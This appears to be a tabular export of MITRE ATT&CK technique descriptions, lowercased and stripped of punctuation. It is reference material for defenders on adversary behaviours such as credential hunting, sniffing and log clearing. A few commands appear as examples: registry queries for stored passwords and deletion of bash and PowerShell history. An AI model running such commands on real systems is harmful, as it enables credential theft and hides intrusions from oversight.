logic errors  e_g   exploitation for defense  unchecked file types  and external libraries  for example  prior to macos    ventura  code signing and notarization checks were only conducted on first launch  allowing adversaries to write malicious executables to previously opened applications in order to bypass gatekeeper security checks_ citation  theevilbit gatekeeper bypass       citation  application bundle manipulation brandon dalton   applications and files loaded onto the system from a usb flash drive  optical disk  external hard drive  from a drive shared over the local network  or using the curl command may not set the quarantine flag  additionally  it is possible to avoid setting the quarantine flag using  drive by
attack-pattern--31fe0ba2-62fd-4fd9-9293-4043d84f7fe9,['enterprise-attack'],['T1608.004'],Drive-by Target,adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing  endpoint systems may be compromised through browsing to adversary controlled sites  as in  drive by  in such cases  the user's web browser is typically targeted for exploitation  often not requiring any extra user interaction once landing on the site   but adversaries may also set up websites for non exploitation behavior such as  application access  prior to  drive by  adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site  drive by content can be staged on adversary controlled infrastructure that has been acquired   acquire  or previously compromised   compromise   adversaries may upload or inject malicious web content  such as  into websites_ citation  fireeye cfr watering hole       citation  gallagher       this may be done in a number of ways  including inserting malicious script into web pages or other user controllable web content such as forum posts  adversaries may also craft malicious web advertisements and purchase ad space on a website through legitimate ad providers  in addition to staging content to exploit a user's web browser  adversaries may also stage scripting content to profile the user's browser  as in  gather victim host  to ensure it is vulnerable prior to attempting exploitation_ citation  att scanbox   websites compromised by an adversary and used to stage a drive by may be ones visited by a specific community  such as government  a particular industry  or region  where the goal is to compromise a specific user or set of users based on a shared interest  this kind of targeted campaign is referred to a strategic web compromise or watering hole attack_  adversaries may purchase domains similar to legitimate domains  ex  homoglyphs  typosquatting  different top level domain  etc_  during acquisition of infrastructure  to help facilitate  drive by
attack-pattern--322bad5a-1c49-4d23-ab79-76d641794afa,['enterprise-attack'],['T1007'],System Service Discovery,adversaries may try to gather information about registered local system services  adversaries may obtain information about services using tools as well as os utility commands such as sc query  tasklist  svc  systemctl   type service  and net start_  adversaries may use the information from  system service  during automated discovery to shape follow on behaviors  including whether or not the adversary fully infects the target and or attempts specific actions 
attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529,['enterprise-attack'],['T1040'],Network Sniffing,adversaries may sniff network traffic to capture information about an environment  including authentication material passed over the network  network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection  an adversary may place a network interface into promiscuous mode to passively access data in transit over the network  or use span ports to capture a larger amount of data_  data captured via this technique may include user credentials  especially those sent over an insecure  unencrypted protocol  techniques for name service resolution poisoning  such as  llmnr nbt ns poisoning and smb  can also be used to capture credentials to websites  proxies  and internal systems by redirecting traffic to an adversary_  network sniffing may also reveal configuration details  such as running services  version numbers  and other network characteristics  e_g  ip addresses  hostnames  vlan ids  necessary for subsequent lateral movement and or defense evasion activities_  in cloud based environments  adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines  for example  aws traffic mirroring  gcp packet mirroring  and azure vtap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to_ citation  aws traffic mirroring   citation  gcp packet mirroring   citation  azure virtual network tap  often  much of this traffic will be in cleartext due to the use of tls termination at the load balancer level to reduce the strain of encrypting and decrypting traffic_ citation  rhino security labs aws vpc traffic mirroring   citation  specterops aws traffic mirroring  the adversary can then use exfiltration techniques such as transfer data to cloud account in order to access the sniffed traffic   citation  rhino security labs aws vpc traffic mirroring 
attack-pattern--327f3cc5-eea1-42d4-a6cd-ed34b7ce8f61,['enterprise-attack'],['T1017'],Application Deployment Software,adversaries may deploy malicious software to systems within a network using application deployment systems employed by enterprise administrators  the permissions required for this action vary by system configuration  local credentials may be sufficient with direct access to the deployment server  or specific domain credentials may be required  however  the system may require an administrative account to log in or to perform software deployment_  access to a network wide or enterprise wide software deployment system enables an adversary to have remote code execution on all systems that are connected to such a system  the access may be used to laterally move to systems  gather information  or cause a specific effect  such as wiping the hard drives on all endpoints 
attack-pattern--32901740-b42c-4fdd-bc02-345b5dc57082,['enterprise-attack'],['T1553.002'],Code Signing,adversaries may create  acquire  or steal code signing materials to sign their malware or tools  code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with   citation  wikipedia code signing  the certificates used during an operation may be created  acquired  or stolen by the adversary   citation  securelist digital certificates   citation  symantec digital certificates  unlike  invalid code  this activity will result in a valid signature_  code signing to verify software on first run can be used on modern windows and macos systems  it is not used on linux due to the decentralized nature of the platform   citation  wikipedia code signing   code signing certificates may be used to bypass security policies that require signed code to execute on a system 
attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7,['enterprise-attack'],['T1530'],Data from Cloud Storage,adversaries may access data from improperly secured cloud storage_  many cloud service providers offer solutions for online data object storage such as amazon s   azure storage  and google cloud storage  these solutions differ from other storage solutions  such as sql or elasticsearch  in that there is no overarching application  data from these solutions can be retrieved directly using the cloud provider's apis    in other cases  saas application providers such as slack  confluence  and salesforce also provide cloud storage solutions as a peripheral use case of their platform  these cloud objects can be extracted directly from their associated application_ citation  ea hacked via slack   june       citation  secureworld   how secure is your slack channel   dec       citation  hackernews     saas app cyber attacks   april       citation  dark clouds_usenix_mulazzani_  _       adversaries may collect sensitive data from these cloud storage solutions  providers typically offer security guides to help end users configure systems  though misconfigurations are a common problem_ citation  amazon s  security        citation  microsoft azure storage security        citation  google cloud storage best practices        there have been numerous incidents where cloud storage has been improperly secured  typically by unintentionally allowing public access to unauthenticated users  overly broad access by all users  or even access for any anonymous person outside the control of the identity access management system without even needing basic user permissions_  this open access may expose various types of sensitive data  such as credit cards  personally identifiable information  or medical records_ citation  trend micro s  exposed pii        citation  wired magecart s  buckets        citation  hipaa journal s  breach         adversaries may also obtain then abuse leaked credentials from source repositories  logs  or other means as a way to gain access to cloud storage objects 
attack-pattern--32ad5c86-2bcf-47d8-8fdc-d7f3d79a7490,['enterprise-attack'],['T1565.003'],Runtime Data Manipulation,adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user  thus threatening the integrity of the data_ citation  fireeye apt   oct       citation  doj lazarus sony       by manipulating runtime data  adversaries may attempt to affect a business process  organizational understanding  and decision making_  adversaries may alter application binaries used to display data in order to cause runtime manipulations  adversaries may also conduct  change default file  and  to cause a similar effect  the type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary  for complex systems  an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact 
attack-pattern--341e222a-a6e3-4f6f-b69c-831d792b1580,['enterprise-attack'],['T1552.002'],Credentials in Registry,adversaries may search the registry on compromised systems for insecurely stored credentials  the windows registry stores configuration information that can be used by the system or other programs  adversaries may query the registry looking for credentials and passwords that have been stored for use by other programs or services  sometimes these credentials are used for automatic logons_  example commands to find registry keys related to password information   citation  pentestlab stored credentials     local machine hive  reg query hklm  f password  t reg_sz  s   current user hive  reg query hkcu  f password  t reg_sz  s
attack-pattern--3489cfc5-640f-4bb3-a103-9137b97de79f,['enterprise-attack'],['T1135'],Network Share Discovery,adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for collection and to identify potential systems of interest for lateral movement  networks often contain shared network drives and folders that enable users to access file directories on various systems across a network    file sharing over a windows network occurs over the smb protocol   citation  wikipedia shared resource   citation  technet shared folder   can be used to query a remote system for available shared drives using the net view     remotesystem command  it can also be used to query shared drives on the local system using net share  for macos  the sharing  l command lists all shared points used for smb services 
attack-pattern--348f1eef-964b-4eb6-bb53-69b3dcb0c643,['enterprise-attack'],['T1120'],Peripheral Device Discovery,adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system_ citation  peripheral discovery linux  citation  peripheral discovery macos  peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards  printers  cameras  smart card readers  or removable storage  the information may be used to enhance their awareness of the system and network environment or may be used for further actions 
attack-pattern--34ab90a3-05f6-4259-8f21-621081fdaba5,['enterprise-attack'],['T1590.004'],Network Topology,adversaries may gather information about the victim's network topology that can be used during targeting  information about network topologies may include a variety of details  including the physical and or logical arrangement of both external facing and internal network environments  this information may also include specifics regarding network devices  gateways  routers  etc_  and other infrastructure_  adversaries may gather this information in various ways  such as direct collection actions via  active  or  phishing for  information about network topologies may also be exposed to adversaries via online or other accessible data sets  ex   search victim owned  dns dumpster  gathering this information may reveal opportunities for other forms of reconnaissance  ex   search open technical  or  search open  establishing operational resources  ex   acquire  or  compromise  and or initial access  ex   external remote
attack-pattern--34b3f738-bd64-40e5-a112-29b0542bc8bf,['enterprise-attack'],['T1587.002'],Code Signing Certificates,adversaries may create self signed code signing certificates that can be used during targeting  code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted  code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with_ citation  wikipedia code signing  users and or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is_  prior to  code  adversaries may develop self signed code signing certificates for use in operations 
attack-pattern--34e793de-0274-4982-9c1a-246ed1c19dee,['enterprise-attack'],['T1222.001'],Windows File and Directory Permissions Modification,adversaries may modify file or directory permissions attributes to evade access control lists  acls  and access protected files_ citation  hybrid analysis icacls  june       citation  hybrid analysis icacls  may       file and directory permissions are commonly managed by acls configured by the file or directory owner  or users with the appropriate permissions  file and directory acl implementations vary by platform  but generally explicitly designate which users or groups can perform which actions  read  write  execute  etc_ _  windows implements file and directory acls as discretionary access control lists  dacls _ citation  microsoft dacl may       similar to a standard acl  dacls identifies the accounts that are allowed or denied access to a securable object  when an attempt is made to access a securable object  the system checks the access control entries in the dacl in order  if a matching entry is found  access to the object is granted  otherwise  access is denied_ citation  microsoft access control lists may        adversaries can interact with the dacls using built in windows commands  such as  icacls    cacls    takeown   and  attrib   which can grant adversaries higher permissions on specific files and folders  further   provides cmdlets that can be used to retrieve or modify file and directory dacls  specific file and directory modifications may be a required step for many techniques  such as establishing persistence via  accessibility   boot or logon initialization  or tainting hijacking other instrumental binary configuration files via  hijack execution
attack-pattern--34f1d81d-fe88-4f97-bd3b-a3164536255d,['enterprise-attack'],['T1137.006'],Add-ins,adversaries may abuse microsoft office add ins to obtain persistence on a compromised system  office add ins can be used to add functionality to office programs   citation  microsoft office add ins  there are different types of add ins that can be used by the various office products  including word excel add in libraries  wll xll   vba add ins  office component object model  com  add ins  automation add ins  vba editor  vbe   visual studio tools for office  vsto  add ins  and outlook add ins   citation  mrwlabs office persistence add ins  citation  fireeye mail cds        add ins can be used to obtain persistence because they can be set to execute code when an office application starts 
attack-pattern--35187df2-31ed-43b6-a1f5-2f1d3d58d3f1,['enterprise-attack'],['T1505.002'],Transport Agent,adversaries may abuse microsoft transport agents to establish persistent access to systems  microsoft exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam  filtering malicious attachments  journaling  or adding a corporate signature to the end of all outgoing emails_ citation  microsoft transportagent jun       citation  eset lightneuron may       transport agents can be written by application developers and then compiled to _net assemblies that are subsequently registered with the exchange server  transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks    adversaries may register a malicious transport agent to provide a persistence mechanism in exchange server that can be triggered by adversary specified email events_ citation  eset lightneuron may       though a malicious transport agent may be invoked for all emails passing through the exchange transport pipeline  the agent can be configured to only carry out specific tasks in response to adversary defined criteria  for example  the transport agent may only carry out an action like copying in transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary 
attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1,['enterprise-attack'],['T1082'],System Information Discovery,an adversary may attempt to get detailed information about the operating system and hardware  including version  patches  hotfixes  service packs  and architecture  adversaries may use the information from  system information  during automated discovery to shape follow on behaviors  including whether or not the adversary fully infects the target and or attempts specific actions_  tools such as  can be used to gather detailed system information  if running with privileged access  a breakdown of system data can be gathered through the systemsetup configuration tool on macos  as an example  adversaries with user level access can execute the df  ah command to obtain currently mounted disks and associated freely available space  adversaries may also leverage a  network device  on network devices to gather detailed system information  e_g  show version    system information  combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment_ citation     macos common tools and techniques   infrastructure as a service  iaas  cloud providers such as aws  gcp  and azure allow access to instance and virtual machine information via apis  successful authenticated api calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine_ citation  amazon describe instance  citation  google instances resource  citation  microsoft virutal machine api 
attack-pattern--355be19c-ffc9-46d5-8d50-d6a036c675b6,['enterprise-attack'],['T1071'],Application Layer Protocol,adversaries may communicate using application layer protocols to avoid detection network filtering by blending in with existing traffic  commands to the remote system  and often the results of those commands  will be embedded within the protocol traffic between the client and server    adversaries may utilize many different protocols  including those used for web browsing  transferring files  electronic mail  or dns  for connections that occur internally within an enclave  such as those between a proxy or pivot node and other nodes   commonly used protocols are smb  ssh  or rdp 
attack-pattern--359b00ad-9425-420b-bba5-6de8d600cbc0,['enterprise-attack'],['T1074.002'],Remote Data Staging,adversaries may stage data collected from multiple systems in a central location or directory on one system prior to exfiltration  data may be kept in separate files or combined into one file through techniques such as  archive collected  interactive command shells may be used  and common functionality within  and bash may be used to copy data into a staging location_  in cloud environments  adversaries may stage data within a particular instance or virtual machine before exfiltration  an adversary may  create cloud  and stage data in that instance_ citation  mandiant m trends        by staging data on one system prior to exfiltration  adversaries can minimize the number of connections made to their c  server and better evade detection 
attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9,['enterprise-attack'],['T1053'],Scheduled Task/Job,adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code  utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time  a task can also be scheduled on a remote system  provided the proper authentication is met  ex  rpc and file and printer sharing in windows environments   scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system_ citation  technet task scheduler security   adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence  these mechanisms can also be abused to run a process under the context of a specified account  such as one with elevated permissions privileges   similar to  system binary proxy  adversaries have also abused task scheduling to potentially mask one time execution under a trusted system process_ citation  proofpoint serpent 
attack-pattern--365be77f-fc0e-42ee-bac8-4faf806d9336,['enterprise-attack'],['T1218.007'],Msiexec,adversaries may abuse msiexec_exe to proxy execution of malicious payloads  msiexec_exe is the command line utility for the windows installer and is thus commonly associated with executing installation packages  _msi _ citation  microsoft msiexec  the msiexec_exe binary may also be digitally signed by microsoft_  adversaries may abuse msiexec_exe to launch local or network accessible msi files  msiexec_exe can also execute dlls_ citation  lolbas msiexec  citation  trendmicro msiexec feb       since it may be signed and native on windows systems  msiexec_exe can be used to bypass application control solutions that do not account for its potential abuse  msiexec_exe execution may also be elevated to system privileges if the alwaysinstallelevated policy is enabled_ citation  microsoft alwaysinstallelevated      
attack-pattern--36675cd3-fe00-454c-8516-aebecacbe9d9,['enterprise-attack'],['T1162'],Login Item,macos provides the option to list specific applications to run when a user logs in  these applications run under the logged in user's context  and will be started every time the user logs in  login items installed using the service management framework are not visible in the system preferences and can only be removed by the application that created them  citation  adding login items   users have direct control over login items installed using a shared file list which are also visible in system preferences  citation  adding login items   these login items are stored in the user's   library preferences  directory in a plist file called com_apple_loginitems_plist  citation  methods of mac malware persistence   some of these applications can open visible dialogs to the user  but they don t all have to since there is an option to  hide  the window  if an adversary can register their own login item or modified an existing one  then they can use it to execute their code for a persistence mechanism each time the user logs in  citation  malware persistence on os x   citation  osx_dok malware   the api method  smloginitemsetenabled  can be used to set login items  but scripting languages like  can do this as well   citation  adding login items  
attack-pattern--36aa137f-5166-41f8-b2f0-a4cfa1b4133e,['enterprise-attack'],['T1590.003'],Network Trust Dependencies,adversaries may gather information about the victim's network trust dependencies that can be used during targeting  information about network trusts may include a variety of details  including second or third party organizations domains  ex  managed service providers  contractors  etc_  that have connected  and potentially elevated  network access_  adversaries may gather this information in various ways  such as direct elicitation via  phishing for  information about network trusts may also be exposed to adversaries via online or other accessible data sets  ex   search open technical  pentesting ad forests  gathering this information may reveal opportunities for other forms of reconnaissance  ex   active  or  search open  establishing operational resources  ex   acquire  or  compromise  and or initial access  ex   trusted
attack-pattern--36b2a1d7-e09e-49bf-b45e-477076c2ec01,['enterprise-attack'],['T1498.002'],Reflection Amplification,adversaries may attempt to cause a denial of service  dos  by reflecting a high volume of network traffic to a target  this type of network dos takes advantage of a third party server intermediary that hosts and will respond to a given spoofed source ip address  this third party server is commonly termed a reflector  an adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim  similar to direct network floods  more than one system may be used to conduct the attack  or a botnet may be used  likewise  one or more reflectors may be used to focus traffic on the target_ citation  cloudflare reflectiondos may       this network dos attack may also reduce the availability and functionality of the targeted system s  and network_  reflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic  commonly known as a reflection amplification attack  adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers  the extent of this increase will depending upon many variables  such as the protocol in question  the technique used  and the amplifying servers that actually produce the amplification in attack volume  two prominent protocols that have enabled reflection amplification floods are dns citation  cloudflare dnsamplficationdos  and ntp citation  cloudflare ntpamplifciationdos   though the use of several others in the wild have been documented_ citation  arbor annualdosreport jan        in particular  the memcache protocol showed itself to be a powerful protocol  with amplification sizes up to        times the requesting packet_ citation  cloudflare memcrashed feb      
attack-pattern--3731fbcd-0e43-47ae-ae6c-d15e510f0d42,['enterprise-attack'],['T1556.002'],Password Filter DLL,adversaries may register malicious password filter dynamic link libraries  dlls  into the authentication process to acquire user credentials as they are validated    windows password filters are password policy enforcement mechanisms for both domain and local accounts  filters are implemented as dlls containing a method to validate potential passwords against password policies  filter dlls can be positioned on local computers for local accounts and or domain controllers for domain accounts  before registering new passwords in the security accounts manager  sam   the local security authority  lsa  requests validation from each registered filter  any potential changes cannot take effect until every registered filter acknowledges validation    adversaries can register malicious password filters to harvest credentials from local computers and or entire domains  to perform proper validation  filters must receive plain text credentials from the lsa  a malicious password filter would receive these plain text credentials every time a password request is made_ citation  carnal ownage password filters sept      
attack-pattern--379809f6-2fac-42c1-bd2e-e9dee70b27f8,['enterprise-attack'],['T1505.005'],Terminal Services DLL,adversaries may abuse components of terminal services to enable persistent access to systems  microsoft terminal services  renamed to remote desktop services in some windows server oss as of       enable remote terminal connections to hosts  terminal services allows servers to transmit a full  interactive  graphical user interface to clients via rdp_ citation  microsoft remote desktop services    windows  that are run as a  generic  process  ex  svchost_exe  load the service's dll file  the location of which is stored in a registry entry named servicedll_ citation  microsoft system services fundamentals  the termsrv_dll file  typically stored in   systemroot  system      is the default servicedll value for terminal services in  hklm system currentcontrolset services termservice parameters  _  adversaries may modify and or replace the terminal services dll to enable persistent access to victimized hosts_ citation  james termserv dll  modifications to this dll could be done to execute arbitrary payloads  while also potentially preserving normal termsrv_dll functionality  as well as to simply enable abusable features of terminal services  for example  an adversary may enable features such as concurrent  remote desktop  sessions by either patching the termsrv_dll file or modifying the servicedll value to point to a dll that provides increased rdp functionality_ citation  windows os hub rdp  citation  rdpwrap github  on a non server windows os this increased functionality may also enable an adversary to avoid terminal services prompts that warn log out users of a system when a new rdp session is created 
attack-pattern--37b11151-1776-4f8f-b328-30939fbf2ceb,['enterprise-attack'],['T1059.002'],AppleScript,adversaries may abuse applescript for execution  applescript is a macos scripting language designed to control applications and parts of the os via inter application messages called appleevents_ citation  apple applescript  these appleevent messages can be sent independently or easily scripted with applescript  these events can locate open windows  send keystrokes  and interact with almost any open application locally or remotely_  scripts can be run from the command line via osascript  path to script or osascript  e  script here   aside from the command line  scripts can be executed in numerous ways including mail rules  calendar_app alarms  and automator workflows  applescripts can also be executed as plain text shell scripts by adding    usr bin osascript to the start of the script file_ citation  sentinelone applescript   applescripts do not need to call osascript to execute  however  they may be executed from within mach o binaries by using the macos  native  nsapplescript or osascript  both of which execute code independent of the  usr bin osascript command line utility_  adversaries may abuse applescript to execute various behaviors  such as interacting with an open ssh connection  moving to remote machines  and even presenting users with fake dialog boxes  these events cannot start applications remotely  they can start them locally   but they can interact with applications if they're already running remotely  on macos   _   yosemite and higher  applescript has the ability to execute  native  which otherwise would require compilation and execution in a mach o binary file format_ citation  sentinelone macos red team  since this is a scripting language  it can be used to launch more common techniques as well such as a reverse shell via  macro malware targets macs 
attack-pattern--389735f1-f21c-4208-b8f0-f8031e7169b8,['enterprise-attack'],['T1176'],Browser Extensions,adversaries may abuse internet browser extensions to establish persistent access to victim systems  browser extensions or plugins are small programs that can add functionality and customize aspects of internet browsers  they can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access_ citation  wikipedia browser extension  citation  chrome extensions definition   malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions  through social engineering  or by an adversary that has already compromised a system  security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners_ citation  malicious chrome extension numbers  depending on the browser  adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions_  previous to macos     adversaries could silently install browser extensions via the command line using the profiles tool to install malicious _mobileconfig files  in macos      the use of the profiles tool can no longer install configuration profiles  however _mobileconfig files can be planted and installed with user interaction_ citation  xorrior chrome extensions macos   once the extension is installed  it can browse to websites in the background  steal all information that a user enters into a browser  including credentials   and be used as an installer for a rat for persistence_ citation  chrome extension crypto miner  citation  icebrg chrome extensions  citation  banker google chrome extension steals creds  citation  catch all chrome extension   there have also been instances of botnets using a persistent backdoor through malicious chrome extensions_ citation  stantinko botnet  there have also been similar examples of extensions being used for command   control_ citation  chrome extension c  malware 
attack-pattern--38eb0c22-6caf-46ce-8869-5964bd735858,['enterprise-attack'],['T1499.002'],Service Exhaustion Flood,adversaries may target the different network services provided by systems to conduct a denial of service  dos   adversaries often target the availability of dns and web services  however others have been targeted as well_ citation  arbor annualdosreport jan       web server software can be attacked through a variety of means  some of which apply generally while others are specific to the software being used to provide the service_  one example of this type of attack is known as a simple http flood  where an adversary sends a large number of http requests to a web server to overwhelm it and or an application that runs on top of it  this flood relies on raw volume to accomplish the objective  exhausting any of the various resources required by the victim software to provide the service_ citation  cloudflare httpflood   another variation  known as a ssl renegotiation attack  takes advantage of a protocol feature in ssl tls  the ssl tls protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections  if ssl renegotiation is enabled  a request can be made for renegotiation of the crypto algorithm  in a renegotiation attack  the adversary establishes a ssl tls connection and then proceeds to make a series of renegotiation requests  because the cryptographic renegotiation has a meaningful cost in computation cycles  this can cause an impact to the availability of the service when done in volume_ citation  arbor ssldos april      
attack-pattern--39131305-9282-45e4-ac3b-591d2d4fc3ef,['enterprise-attack'],['T1195.003'],Compromise Hardware Supply Chain,adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise  by modifying hardware or firmware in the supply chain  adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system  hardware backdoors may be inserted into various devices  such as servers  workstations  network infrastructure  or peripherals 
attack-pattern--391d824f-0ef1-47a0-b0ee-c59a75e27670,['enterprise-attack'],['T1106'],Native API,adversaries may interact with the native os application programming interface  api  to execute behaviors  native apis provide a controlled means of calling low level os services within the kernel  such as those involving hardware devices  memory  and processes_ citation  nt api windows  citation  linux kernel api  these native apis are leveraged by the os during system boot  when other system components are not yet initialized  as well as carrying out tasks and requests during routine operations_  native api functions  such as ntcreateprocess  may be directed invoked via system calls   syscalls  but these features are also often exposed to user mode applications via interfaces and libraries_ citation  outflank system calls  citation  cyberbit system calls  citation  mdsec system calls  for example  functions such as the windows api createprocess   or gnu fork   will allow programs and scripts to start other processes_ citation  microsoft createprocess  citation  gnu fork  this may allow api callers to execute a binary  run a cli command  load modules  etc  as thousands of similar api functions exist for various system operations_ citation  microsoft win     higher level software frameworks  such as microsoft _net and macos cocoa  are also available to interact with native apis  these frameworks typically provide language wrappers abstractions to api functionalities and are designed for ease of use portability of code_ citation  microsoft net  citation  apple core services  citation  macos cocoa  citation  macos foundation   adversaries may abuse these os api functions as a means of executing behaviors  similar to  command and scripting  the native api and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system  while invoking api functions  adversaries may also attempt to bypass defensive tools  ex  unhooking monitored functions via  disable or modify
attack-pattern--3975dbb5-0e1e-4f5b-bae1-cf2ab84b46dc,['enterprise-attack'],['T1070.007'],Clear Network Connection History and Configurations,adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations  configuration settings as well as various artifacts that highlight connection history may be created on a system from behaviors that require network connections  such as  remote  or  external remote  defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries_  network connection history may be stored in various locations on a system  for example  rdp connection history may be stored in windows registry values under  citation  microsoft rdp removal      hkey_current_user software microsoft terminal server client default   hkey_current_user software microsoft terminal server client servers  windows may also store information about recent rdp connections in files such as c  users   username  documents default_rdp and  c  users  username  appdata local microsoft terminal server client cache  _ citation  moran rdpieces  similarly  macos and linux hosts may store information highlighting connection history in system logs  such as those stored in   library logs  and or   var log   _ citation  apple culprit access  citation  freedesktop journal  citation  apple unified log analysis remote login and screen sharing   malicious network connections may also require changes to network configuration settings  such as  disable or modify system  or tampering to enable  adversaries may delete or modify this data to conceal indicators and or impede defensive analysis 
attack-pattern--3986e7fd-a8e9-4ecb-bfc6-55920855912b,['enterprise-attack'],['T1558.004'],AS-REP Roasting,adversaries may reveal credentials of accounts that have disabled kerberos preauthentication by  password  kerberos messages_ citation  harmj y roasting as reps jan         preauthentication offers protection against offline  password  when enabled  a user requesting access to a resource initiates communication with the domain controller  dc  by sending an authentication server request  as req  message with a timestamp that is encrypted with the hash of their password  if and only if the dc is able to successfully decrypt the timestamp with the hash of the user s password  it will then send an authentication server response  as rep  message that contains the ticket granting ticket  tgt  to the user  part of the as rep message is signed with the user s password_ citation  microsoft kerberos preauth        for each account found without preauthentication  an adversary may send an as req message without the encrypted timestamp and receive an as rep message with tgt data which may be encrypted with an insecure algorithm such as rc   the recovered encrypted data may be vulnerable to offline  password  attacks similarly to  and expose plaintext credentials   citation  harmj y roasting as reps jan       citation  stealthbits cracking as rep roasting jun         an account registered to a domain  with or without special privileges  can be abused to list all domain accounts that have preauthentication disabled by utilizing windows tools like  with an ldap filter  alternatively  the adversary may send an as req message for each user  if the dc responds without errors  the account does not require preauthentication and the as rep message will already contain the encrypted data   citation  harmj y roasting as reps jan       citation  stealthbits cracking as rep roasting jun        cracked hashes may enable   privilege  and  lateral  via access to  valid  sans attacking kerberos nov      
attack-pattern--39a130e1-6ab7-434a-8bd2-418e7d9d6427,['enterprise-attack'],['T1058'],Service Registry Permissions Weakness,windows stores local service configuration information in the registry under hklm system currentcontrolset services  the information stored under a service's registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller  sc_exe   or  access to registry keys is controlled through access control lists and permissions   citation  msdn registry key security   if the permissions for users and groups are not properly set and allow access to the registry keys for a service  then adversaries can change the service binpath imagepath to point to a different executable under their control  when the service starts or is restarted  then the adversary controlled program will execute  allowing the adversary to gain persistence and or privilege escalation to the account context the service is set to execute under  local domain account  system  localservice  or networkservice _  adversaries may also alter registry keys associated with service failure parameters  such as failurecommand  that may be executed in an elevated context anytime the service fails or is intentionally corrupted_ citation  trustedsignal service failure  citation  twitter service recovery nov      
attack-pattern--39cc9f64-cf74-4a48-a4d8-fe98c54a02e0,['enterprise-attack'],['T1584.003'],Virtual Private Server,adversaries may compromise third party virtual private servers  vpss  that can be used during targeting  there exist a variety of cloud service providers that will sell virtual machines containers as a service  adversaries may compromise vpss purchased by third party entities  by compromising a vps to use as infrastructure  adversaries can make it difficult to physically tie back operations to themselves_ citation  nsa ncsc turla oilrig   compromising a vps for use in later stages of the adversary lifecycle  such as command and control  can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third party 
attack-pattern--3a40f208-a9c1-4efa-a598-4003c3681fb8,['enterprise-attack'],['T1600.001'],Reduce Key Space,adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications_ citation  cisco synful knock evolution   adversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext  e_g_  from hundreds or thousands of bytes to just a couple of bytes   as a result  adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key_  adversaries may modify the key size used and other encryption parameters using specialized commands in a  network device  introduced to the system through  modify system  to change the configuration of the device   citation  cisco blog legacy device attacks 
attack-pattern--3aef9463-9a7a-43ba-8957-a867e07c1e6a,['enterprise-attack'],['T1070.003'],Clear Command History,in addition to clearing system logs  an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion  various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done_  on linux and macos  these command histories can be accessed in a few different ways  while logged in  this command history is tracked in a file pointed to by the environment variable histfile  when a user logs off a system  this information is flushed to a file in the user's home directory called   _bash_history  the benefit of this is that it allows users to go back to commands they've used before in different sessions_  adversaries may delete their commands from these logs by manually clearing the history  history  c  or deleting the bash history file rm   _bash_history     adversaries may also leverage a  network device  on network devices to clear command history data  clear logging and or clear history _  on windows hosts  powershell has two different command history providers  the built in history and the command history managed by the psreadline module  the built in history only tracks the commands used in the current session  this command history is not available to other sessions and is deleted when the session ends_  the psreadline command history tracks the commands used in all powershell sessions and writes them to a file   env appdata microsoft windows powershell psreadline consolehost_history_txt by default   this history file is available to all sessions and contains all past history since the file is not deleted when the session ends_ citation  microsoft powershell command history   adversaries may run the powershell command clear history to flush the entire command history from a current powershell session  this  however  will not delete flush the consolehost_history_txt file  adversaries may also delete the consolehost_history_txt file or edit its contents to hide powershell commands they have run_ citation  sophos powershell command audit  citation  sophos powershell command history forensics 
